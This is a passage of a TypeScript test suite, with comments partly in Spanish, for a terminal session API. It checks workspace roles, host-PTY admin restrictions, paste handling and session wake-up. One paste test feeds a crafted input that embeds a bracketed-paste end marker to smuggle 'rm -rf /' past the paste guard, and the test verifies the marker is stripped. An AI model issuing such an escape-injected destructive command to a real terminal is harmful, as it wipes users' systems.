    ).rejects.toMatchObject({ code: "INVALID_PATTERN" })
    expect(ptyManager.calls.waitFor).toEqual([])
  })

  it("sin sesión → TERMINAL_NOT_FOUND", async () => {
    const { handlers } = setup()
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), { terminalId: "t_gone", pattern: "ready" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
  })

  it("PTY ajeno → FORBIDDEN_TERMINAL sin esperar", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
      ownerByWorkspace: { work_victim: "victim" },
      members: [],
    })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("attacker"), {
        terminalId: "t_victim",
        pattern: "ready",
      }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.waitFor).toEqual([])
  })

  it("match ya en el buffer → {matched:true, line, lineIndex, cursor}", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [
        { terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["$ ls", "file1  file2", "$ "] },
      ],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.waitFor")!(ctx("u1"), {
      terminalId: "t1",
      pattern: "file1",
    })
    expect(res).toEqual({ matched: true, line: "file1  file2", lineIndex: 1, cursor: 2 })
    expect(ptyManager.calls.waitFor).toHaveLength(1)
  })

  it("timeout → WAIT_TIMEOUT con el mensaje del manager (y timeoutMs propagado)", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["nothing here"] }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), {
        terminalId: "t1",
        pattern: "never",
        timeoutMs: 30,
      }),
    ).rejects.toMatchObject({ code: "WAIT_TIMEOUT" })
    expect(ptyManager.calls.waitFor).toEqual([
      ["t1", expect.any(RegExp), { timeoutMs: 30, fromLine: undefined }],
    ])
  })

  it("softTimeout:true → {matched:false} en vez de error", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["nothing here"] }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.waitFor")!(ctx("u1"), {
      terminalId: "t1",
      pattern: "never",
      timeoutMs: 30,
      softTimeout: true,
    })
    expect(res).toEqual({ matched: false, line: null, lineIndex: null, cursor: null })
  })

  it("error no-timeout del manager (sesión muerta) NO se enmascara como WAIT_TIMEOUT", async () => {
    const { router, handlers } = makeRouter()
    const ptyManager = {
      has: () => true,
      ownerOf: () => "work_mine",
      isHost: () => false,
      waitFor: () => Promise.reject(new Error("waitFor: session t1 ended")),
    } as any
    register(router, {
      pubSubService: {
        subscribeSession: mock(() => {}),
        unsubscribeSession: mock(() => {}),
      } as any,
      ptyManager,
      mcaService: { getApp: mock(async () => null) } as any,
      mcaManager: { executeTool: mock(async () => ({})) } as any,
      db: makeAuthDb({ ownerByWorkspace: { work_mine: "u1" } }),
      exec: mock(() => ""),
    })
    // El error crudo se propaga tal cual (el router lo normaliza a INTERNAL_ERROR):
    // solo los timeouts del manager se convierten en WAIT_TIMEOUT.
    await expect(
      handlers.get("terminal.waitFor")!(ctx("u1"), {
        terminalId: "t1",
        pattern: "x",
        timeoutMs: 50,
      }),
    ).rejects.toThrow("waitFor: session t1 ended")
  })
})

describe("terminal.status — estado detallado de una sesión", () => {
  it("MISSING_TERMINAL_ID sin terminalId", async () => {
    const { handlers } = setup()
    await expect(handlers.get("terminal.status")!(ctx("u1"), {})).rejects.toMatchObject({
      code: "MISSING_TERMINAL_ID",
    })
  })

  it("sin sesión → TERMINAL_NOT_FOUND", async () => {
    const { handlers } = setup()
    await expect(
      handlers.get("terminal.status")!(ctx("u1"), { terminalId: "t_gone" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
  })

  it("PTY ajeno → FORBIDDEN_TERMINAL sin filtrar estado", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t_victim", ownerWorkspaceId: "work_victim" }],
      ownerByWorkspace: { work_victim: "victim" },
      members: [],
    })
    await expect(
      handlers.get("terminal.status")!(ctx("attacker"), { terminalId: "t_victim" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
  })

  it("PTY propio → {status} con cursores de buffer y lifecycle", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["a", "b"] }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.status")!(ctx("u1"), { terminalId: "t1" })
    expect(res.status).toMatchObject({
      terminalId: "t1",
      ownerWorkspaceId: "work_mine",
      bufferSize: 2,
      bufferStartLine: 0,
      bufferNextLine: 2,
      alive: true,
    })
  })
})

// ---------------------------------------------------------------------------
// terminal.list — introspección filtrada por workspace
// ---------------------------------------------------------------------------

describe("terminal.list — solo sesiones de workspaces accesibles", () => {
  it("devuelve solo las sesiones de workspaces donde el caller es owner o miembro con escritura", async () => {
    const { handlers } = setup({
      ptySeed: [
        { terminalId: "t_mine", ownerWorkspaceId: "work_mine" },
        { terminalId: "t_member", ownerWorkspaceId: "work_member" },
        { terminalId: "t_reader", ownerWorkspaceId: "work_reader" },
        { terminalId: "t_victim", ownerWorkspaceId: "work_victim" },
      ],
      ownerByWorkspace: {
        work_mine: "u1",
        work_member: "other",
        work_reader: "other",
        work_victim: "victim",
      },
      members: [
        ["work_member", "u1", "write"],
        ["work_reader", "u1", "read"],
      ],
    })
    const res = await handlers.get("terminal.list")!(ctx("u1"))
    expect(res.sessions.map((s: any) => s.terminalId).sort()).toEqual(["t_member", "t_mine"])
    expect(res.sessions.every((s: any) => s.ownerWorkspaceId !== "work_victim")).toBe(true)
  })

  it("oculta sesiones legacy sin owner (fail-closed como el resto del dominio)", async () => {
    const { handlers } = setup({
      ptySeed: [
        { terminalId: "t_legacy" },
        { terminalId: "t_mine", ownerWorkspaceId: "work_mine" },
      ],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.list")!(ctx("u1"))
    expect(res.sessions.map((s: any) => s.terminalId)).toEqual(["t_mine"])
  })
})

const BASH_APP = { ...APP, mcaId: "mca.teros.bash" }

describe("host PTY existente — attach solo para system admins (no basta con ser del workspace)", () => {
  const hostSeed = [
    { terminalId: "t_host", ownerWorkspaceId: "work_mine", host: true, buffer: ["root@prod:~# "] },
  ]
  const memberOpts = {
    ptySeed: hostSeed,
    ownerByWorkspace: { work_mine: "owner" },
    members: [["work_mine", "writer", "write"]] as Array<[string, string, "write"]>,
  }

  it("terminal.create reuse por terminalId (con app normal del workspace) → FORBIDDEN, sin subscribe", async () => {
    const { handlers, pubSubService } = setup({ ...memberOpts, app: BASH_APP })
    await expect(
      handlers.get("terminal.create")!(ctx("writer"), {
        terminalId: "t_host",
        appId: BASH_APP.appId,
      }),
    ).rejects.toMatchObject({ code: expect.stringMatching(/^FORBIDDEN/) })
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("terminal.input / write → FORBIDDEN_TERMINAL, sin escribir", async () => {
    const { handlers, ptyManager } = setup(memberOpts)
    await expect(
      handlers.get("terminal.input")!(ctx("writer"), { terminalId: "t_host", data: "env\r" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.write")!(ctx("writer"), {
        terminalId: "t_host",
        data: "env",
        sendEnter: true,
      }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("terminal.read / waitFor / status / subscribe → FORBIDDEN_TERMINAL (el output del host no se lee)", async () => {
    const { handlers, ptyManager, pubSubService } = setup(memberOpts)
    await expect(
      handlers.get("terminal.read")!(ctx("writer"), { terminalId: "t_host" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.waitFor")!(ctx("writer"), { terminalId: "t_host", pattern: "#" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.status")!(ctx("writer"), { terminalId: "t_host" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.subscribe")!(ctx("writer"), { terminalId: "t_host" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.read).toEqual([])
    expect(ptyManager.calls.waitFor).toEqual([])
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("terminal.resize / destroy → FORBIDDEN_TERMINAL", async () => {
    const { handlers, ptyManager } = setup(memberOpts)
    await expect(
      handlers.get("terminal.resize")!(ctx("writer"), { terminalId: "t_host", cols: 1, rows: 1 }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.destroy")!(ctx("writer"), { terminalId: "t_host" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.resize).toEqual([])
    expect(ptyManager.calls.destroy).toEqual([])
  })

  it("terminal.list no expone el terminalId de un host PTY a un no-admin", async () => {
    const { handlers } = setup({
      ...memberOpts,
      ptySeed: [...hostSeed, { terminalId: "t_docker", ownerWorkspaceId: "work_mine" }],
    })
    const res = await handlers.get("terminal.list")!(ctx("writer"))
    expect(res.sessions.map((s: any) => s.terminalId)).toEqual(["t_docker"])
  })

  it("bridge MCA con ctx del owner system admin → FORBIDDEN_TERMINAL en input", async () => {
    const { handlers, ptyManager } = setup({
      ...memberOpts,
      ownerByWorkspace: { work_mine: "u1" },
      systemRoles: { u1: "admin" },
    })
    await expect(
      handlers.get("terminal.input")!(bridgeCtx("u1"), { terminalId: "t_host", data: "id\r" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("system admin del workspace → input, read y list funcionan sobre su host PTY", async () => {
    const { handlers, ptyManager } = setup({
      ...memberOpts,
      ownerByWorkspace: { work_mine: "u1" },
      systemRoles: { u1: "admin" },
    })
    expect(
      await handlers.get("terminal.input")!(ctx("u1"), { terminalId: "t_host", data: "id\r" }),
    ).toEqual({ ok: true })
    expect(ptyManager.calls.write).toEqual([["t_host", "id\r"]])
    const read = await handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t_host" })
    expect(read.output).toBe("root@prod:~# ")
    const list = await handlers.get("terminal.list")!(ctx("u1"))
    expect(list.sessions.map((s: any) => s.terminalId)).toEqual(["t_host"])
  })
})

// ---------------------------------------------------------------------------
// Rol del workspace: abrir/escribir en un shell (aunque sea el contenedor) es
// escritura — un miembro read no abre, no teclea ni destruye; sí puede mirar.
// ---------------------------------------------------------------------------

describe("rol read del workspace — sin shell interactivo", () => {
  const readerOpts = {
    ownerByWorkspace: { work_mine: "owner" },
    members: [["work_mine", "reader", "read"]] as Array<[string, string, "read"]>,
  }

  it("terminal.create (contenedor) → FORBIDDEN_WORKSPACE_ROLE, sin warmup ni PTY", async () => {
    const { handlers, ptyManager, mcaManager, pubSubService } = setup({
      ...readerOpts,
      app: BASH_APP,
    })
    await expect(
      handlers.get("terminal.create")!(ctx("reader"), { terminalId: "t1", appId: BASH_APP.appId }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    expect(mcaManager.executeTool).not.toHaveBeenCalled()
    expect(ptyManager.calls.create).toEqual([])
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("terminal.create reuse de un PTY del workspace → FORBIDDEN_WORKSPACE_ROLE", async () => {
    const { handlers, pubSubService } = setup({
      ...readerOpts,
      app: BASH_APP,
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
    })
    await expect(
      handlers.get("terminal.create")!(ctx("reader"), { terminalId: "t1", appId: BASH_APP.appId }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("terminal.input / write / destroy → FORBIDDEN_WORKSPACE_ROLE", async () => {
    const { handlers, ptyManager } = setup({
      ...readerOpts,
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
    })
    await expect(
      handlers.get("terminal.input")!(ctx("reader"), { terminalId: "t1", data: "ls\r" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    await expect(
      handlers.get("terminal.write")!(ctx("reader"), {
        terminalId: "t1",
        data: "ls",
        sendEnter: true,
      }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    await expect(
      handlers.get("terminal.destroy")!(ctx("reader"), { terminalId: "t1" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    expect(ptyManager.calls.write).toEqual([])
    expect(ptyManager.calls.destroy).toEqual([])
  })

  it("member sin role registrado cuenta como read (igual que WorkspaceService.canWrite)", async () => {
    const { handlers, ptyManager } = setup({
      ownerByWorkspace: { work_mine: "owner" },
      members: [["work_mine", "legacy"]],
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
    })
    await expect(
      handlers.get("terminal.input")!(ctx("legacy"), { terminalId: "t1", data: "ls\r" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    expect(ptyManager.calls.write).toEqual([])
  })

  // Decisión D6 (terminal-gem): ver un terminal es tan privilegiado como
  // teclear en él (la pantalla muestra secretos: env, claves, códigos OAuth).
  // Un miembro read no lista, no lee, no mira y no redimensiona.
  it("terminal.read / screen / status / subscribe / waitFor / resize / update → FORBIDDEN_WORKSPACE_ROLE para read", async () => {
    const { handlers, pubSubService, ptyManager } = setup({
      ...readerOpts,
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["hello"] }],
    })
    const denied = { code: "FORBIDDEN_WORKSPACE_ROLE" }
    await expect(
      handlers.get("terminal.read")!(ctx("reader"), { terminalId: "t1" }),
    ).rejects.toMatchObject(denied)
    await expect(
      handlers.get("terminal.screen")!(ctx("reader"), { terminalId: "t1" }),
    ).rejects.toMatchObject(denied)
    await expect(
      handlers.get("terminal.status")!(ctx("reader"), { terminalId: "t1" }),
    ).rejects.toMatchObject(denied)
    await expect(
      handlers.get("terminal.subscribe")!(ctx("reader"), { terminalId: "t1" }),
    ).rejects.toMatchObject(denied)
    await expect(
      handlers.get("terminal.waitFor")!(ctx("reader"), { terminalId: "t1", pattern: "hello" }),
    ).rejects.toMatchObject(denied)
    await expect(
      handlers.get("terminal.resize")!(ctx("reader"), { terminalId: "t1", cols: 20, rows: 5 }),
    ).rejects.toMatchObject(denied)
    await expect(
      handlers.get("terminal.update")!(ctx("reader"), { terminalId: "t1", pinned: false }),
    ).rejects.toMatchObject(denied)
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
    expect(ptyManager.calls.read).toEqual([])
    expect(ptyManager.calls.resize).toEqual([])
  })

  it("terminal.list no muestra las sesiones del workspace a un read; terminal.watch lo rechaza", async () => {
    const { handlers, pubSubService } = setup({
      ...readerOpts,
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
    })
    expect((await handlers.get("terminal.list")!(ctx("reader"))).sessions).toEqual([])
    await expect(
      handlers.get("terminal.watch")!(ctx("reader"), { workspaceId: "work_mine" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_WORKSPACE_ROLE" })
    expect(pubSubService.subscribeSession).not.toHaveBeenCalled()
  })

  it("member write → terminal.create en contenedor permitido", async () => {
    const { handlers, ptyManager } = setup({
      app: BASH_APP,
      ownerByWorkspace: { work_mine: "owner" },
      members: [["work_mine", "writer", "write"]],
    })
    const res = await handlers.get("terminal.create")!(ctx("writer"), {
      terminalId: "t1",
      appId: BASH_APP.appId,
    })
    expect(res).toEqual({ terminalId: "t1", cols: 120, rows: 45 })
    expect(ptyManager.calls.create).toHaveLength(1)
  })
})

// ---------------------------------------------------------------------------
// Duplicate sessions: a create retried while the first is in flight
// ---------------------------------------------------------------------------

describe("terminal.create — same terminalId in flight (no duplicate sessions)", () => {
  it("a retry with the same id joins the first call: one warmup, one PTY, the retry gets reused:true", async () => {
    const { handlers, ptyManager, mcaManager } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "u1" },
    })
    // Cold start: the warmup takes a while (the UI request may time out meanwhile).
    let release!: () => void
    const gate = new Promise<void>((r) => {
      release = r
    })
    mcaManager.executeTool.mockImplementation(async () => {
      await gate
      return {}
    })
    const req = { terminalId: "t_new", appId: APP.appId, subscribe: false }
    const first = handlers.get("terminal.create")!(ctx("u1"), req)
    const retry = handlers.get("terminal.create")!(ctx("u1"), req)
    await new Promise((r) => setTimeout(r, 10))
    release()
    const [a, b] = await Promise.all([first, retry])
    expect(a.reused).toBeUndefined()
    expect(b.reused).toBe(true)
    expect(mcaManager.executeTool).toHaveBeenCalledTimes(1)
    expect(ptyManager.calls.create.length).toBe(1)
  })

  it("when the first call fails, the retry makes a fresh attempt", async () => {
    const { handlers, ptyManager, mcaManager } = setup({
      app: APP,
      ownerByWorkspace: { work_mine: "u1" },
    })
    let calls = 0
    mcaManager.executeTool.mockImplementation(async () => {
      calls++
      if (calls === 1) throw new Error("warmup failed")
      return {}
    })
    const req = { terminalId: "t_retry", appId: APP.appId, subscribe: false }
    const first = handlers.get("terminal.create")!(ctx("u1"), req)
    const retry = handlers.get("terminal.create")!(ctx("u1"), req)
    await expect(first).rejects.toThrow("warmup failed")
    const b = await retry
    expect(b.terminalId).toBe("t_retry")
    expect(ptyManager.calls.create.length).toBe(1)
  })

  it("reveal:true asks the window to show the new session", async () => {
    const { handlers, ptyManager } = setup({ app: APP, ownerByWorkspace: { work_mine: "u1" } })
    await handlers.get("terminal.create")!(ctx("u1"), {
      terminalId: "t_show",
      appId: APP.appId,
      reveal: true,
    })
    expect(ptyManager.revealed).toEqual(["t_show"])
  })
})

describe("terminal.write — paste", () => {
  const seed = (bracketedPaste: boolean) => ({
    ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", bracketedPaste }],
    ownerByWorkspace: { work_mine: "u1" },
  })

  it('paste:"auto" + multi-line + app with bracketed paste → one paste, then Enter', async () => {
    const { handlers, ptyManager } = setup(seed(true))
    const res = await handlers.get("terminal.write")!(ctx("u1"), {
      terminalId: "t1",
      data: "line one\nline two",
      sendEnter: true,
      paste: "auto",
    })
    expect(res.pasted).toBe(true)
    expect(ptyManager.calls.write).toEqual([["t1", "\x1b[200~line one\nline two\x1b[201~\r"]])
  })

  it('paste:"auto" leaves single lines and apps without bracketed paste alone', async () => {
    const { handlers, ptyManager } = setup(seed(false))
    await handlers.get("terminal.write")!(ctx("u1"), {
      terminalId: "t1",
      data: "a\nb",
      paste: "auto",
    })
    const one = setup(seed(true))
    await one.handlers.get("terminal.write")!(ctx("u1"), {
      terminalId: "t1",
      data: "single",
      paste: "auto",
    })
    expect(ptyManager.calls.write).toEqual([["t1", "a\nb"]])
    expect(one.ptyManager.calls.write).toEqual([["t1", "single"]])
  })

  it("paste:true strips paste markers from the text (no early close)", async () => {
    const { handlers, ptyManager } = setup(seed(false))
    await handlers.get("terminal.write")!(ctx("u1"), {
      terminalId: "t1",
      data: "x\x1b[201~rm -rf /",
      paste: true,
    })
    expect(ptyManager.calls.write).toEqual([["t1", "\x1b[200~xrm -rf /\x1b[201~"]])
  })

  it("paste must be a boolean or auto", async () => {
    const { handlers } = setup(seed(true))
    await expect(
      handlers.get("terminal.write")!(ctx("u1"), { terminalId: "t1", data: "x", paste: "yes" }),
    ).rejects.toMatchObject({ code: "INVALID_PASTE" })
  })
})

describe("terminal.wait / terminal.reveal — validation and authz", () => {
  it("INVALID_UNTIL, INVALID_TIMEOUT, text without text/pattern", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const wait = handlers.get("terminal.wait")!
    await expect(wait(ctx("u1"), { terminalId: "t1", until: "forever" })).rejects.toMatchObject({
      code: "INVALID_UNTIL",
    })
    await expect(
      wait(ctx("u1"), { terminalId: "t1", until: "turn", timeoutMs: 500_000 }),
    ).rejects.toMatchObject({ code: "INVALID_TIMEOUT" })
    await expect(wait(ctx("u1"), { terminalId: "t1", until: "text" })).rejects.toMatchObject({
      code: "INVALID_PATTERN",
    })
  })

  it("a foreign session → FORBIDDEN_TERMINAL; a missing one → TERMINAL_NOT_FOUND", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t_other", ownerWorkspaceId: "work_other" }],
      ownerByWorkspace: { work_mine: "u1", work_other: "u2" },
    })
    await expect(
      handlers.get("terminal.wait")!(ctx("u1"), { terminalId: "t_other", until: "turn" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.reveal")!(ctx("u1"), { terminalId: "t_other" }),
    ).rejects.toMatchObject({ code: "FORBIDDEN_TERMINAL" })
    await expect(
      handlers.get("terminal.reveal")!(ctx("u1"), { terminalId: "t_none" }),
    ).rejects.toMatchObject({ code: "TERMINAL_NOT_FOUND" })
  })

  it("reveal → the manager's reveal for an own session", async () => {
    const { handlers, ptyManager } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", createdBy: "agent:app_terminal" }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    expect(await handlers.get("terminal.reveal")!(bridgeCtx("u1"), { terminalId: "t1" })).toEqual({
      ok: true,
      watchers: [],
    })
    expect(ptyManager.revealed).toEqual(["t1"])
  })
})

// ---------------------------------------------------------------------------
// Sessions sleep instead of dying: whatever uses one wakes it first
// ---------------------------------------------------------------------------

describe("frozen and sleeping sessions wake on use (pty-manager lifecycle)", () => {
  const seed = (lifecycle: "frozen" | "sleeping", extra: Partial<PtySeed> = {}) =>
    setup({
      app: APP,
      ptySeed: [
        { terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["a"], lifecycle, createdBy: "agent:app_terminal", ...extra },
      ],
      ownerByWorkspace: { work_mine: "u1" },
    })

  it("an agent's terminal.write wakes a sleeping session BEFORE typing, and says so", async () => {
    const { handlers, ptyManager } = seed("sleeping")
    const res = await handlers.get("terminal.write")!(bridgeCtx("u1"), {
      terminalId: "t1",
      data: "ls",
      sendEnter: true,
    })
    expect(res.woke).toBe("sleeping")
    expect(ptyManager.calls.ensureAwake).toEqual([["t1", "u1"]])
    expect(ptyManager.calls.write).toEqual([["t1", "ls\r"]])
  })

  it("read, screen, wait and input wake it too (frozen → woke 'frozen')", async () => {
    for (const [action, data] of [
      ["terminal.read", { terminalId: "t1" }],
      ["terminal.input", { terminalId: "t1", data: "x" }],
    ] as const) {
      const { handlers, ptyManager } = seed("frozen")
      const res = await handlers.get(action)!(ctx("u1"), data)
      expect(res.woke).toBe("frozen")
      expect(ptyManager.calls.ensureAwake).toHaveLength(1)
    }
  })

  it("an awake session's results carry no woke field (unchanged shape)", async () => {
    const { handlers } = setup({
      ptySeed: [{ terminalId: "t1", ownerWorkspaceId: "work_mine", buffer: ["a"] }],
      ownerByWorkspace: { work_mine: "u1" },
    })
    const res = await handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1" })
    expect("woke" in res).toBe(false)
  })

  it("list and status are passive: they never wake (status wake:true does)", async () => {
    const { handlers, ptyManager } = seed("sleeping")
    const list = await handlers.get("terminal.list")!(ctx("u1"), {})
    expect(list.sessions[0].lifecycle).toBe("sleeping")
    await handlers.get("terminal.status")!(ctx("u1"), { terminalId: "t1" })
    expect(ptyManager.calls.ensureAwake).toEqual([])
    const res = await handlers.get("terminal.status")!(bridgeCtx("u1"), {
      terminalId: "t1",
      wake: true,
    })
    expect(res.woke).toBe("sleeping")
    expect(ptyManager.calls.ensureAwake).toEqual([["t1", "u1"]])
  })

  it("terminal.create of an existing sleeping id reuses it and wakes it", async () => {
    const { handlers } = seed("sleeping")
    const res = await handlers.get("terminal.create")!(ctx("u1"), {
      terminalId: "t1",
      appId: APP.appId,
    })
    expect(res).toMatchObject({ reused: true, woke: "sleeping" })
  })

  it("a session that cannot be woken is TERMINAL_WAKE_FAILED, nothing is typed", async () => {
    const { handlers, ptyManager } = seed("sleeping", { wakeFails: true })
    await expect(
      handlers.get("terminal.write")!(bridgeCtx("u1"), { terminalId: "t1", data: "ls" }),
    ).rejects.toMatchObject({ code: "TERMINAL_WAKE_FAILED" })
    expect(ptyManager.calls.write).toEqual([])
  })

  it("terminal.update still accepts pinned (ignored) — every session is kept", async () => {
    const { handlers } = seed("sleeping")
    const res = await handlers.get("terminal.update")!(ctx("u1"), {
      terminalId: "t1",
      pinned: false,
    })
    // No setPinned on the manager any more: nothing to call, no error.
    expect(res).toHaveProperty("session")
  })
})

describe("spaces on the paths without a terminal host, and for someone who only watches", () => {
  it("[SPACE-AC-10] without terminal hosts a shared terminal is still recorded as shared, a personal one as personal", async () => {
    const { handlers, ptyManager } = setup({ app: APP, ownerByWorkspace: { work_mine: "u1" } })
    await handlers.get("terminal.create")!(ctx("u1"), {
      terminalId: "t_shared",
      appId: APP.appId,
      space: "shared",
    })
    await handlers.get("terminal.create")!(ctx("u1"), { terminalId: "t_mine", appId: APP.appId })
    expect(ptyManager.calls.spaces).toEqual([
      ["t_shared", "u1", "shared"],
      ["t_mine", "u1", "personal"],
    ])
  })

  it("[SPACE-AC-15] a member who only watches cannot wake the terminal: asleep stays asleep until its person uses it", async () => {
    const { handlers, ptyManager } = setup({
      app: APP,
      ptySeed: [
        {
          terminalId: "t1",
          ownerWorkspaceId: "work_mine",
          createdBy: "u1",
          watchable: true,
          lifecycle: "sleeping",
          buffer: ["a"],
        },
      ],
      ownerByWorkspace: { work_mine: "u1" },
      members: [["work_mine", "u2", "write"]],
    })
    for (const [action, data] of [
      ["terminal.read", {}],
      ["terminal.screen", {}],
      ["terminal.status", { wake: true }],
      ["terminal.wait", { until: "quiet", quietMs: 100, timeoutMs: 200 }],
      ["terminal.create", { appId: APP.appId }],
    ] as Array<[string, Record<string, unknown>]>)
      await expect(
        handlers.get(action)!(ctx("u2"), { terminalId: "t1", ...data }),
      ).rejects.toMatchObject({ code: "TERMINAL_ASLEEP" })
    expect(ptyManager.calls.ensureAwake).toEqual([])
    expect((await handlers.get("terminal.status")!(ctx("u2"), { terminalId: "t1" })).status).toBeTruthy()
    const mine = await handlers.get("terminal.read")!(ctx("u1"), { terminalId: "t1" })
    expect(mine.woke).toBe("sleeping")
    expect(ptyManager.calls.ensureAwake).toEqual([["t1", "u1"]])
    await expect(
      handlers.get("terminal.read")!(ctx("u2"), { terminalId: "t1" }),
    ).resolves.toMatchObject({ output: "a" })
  })
})
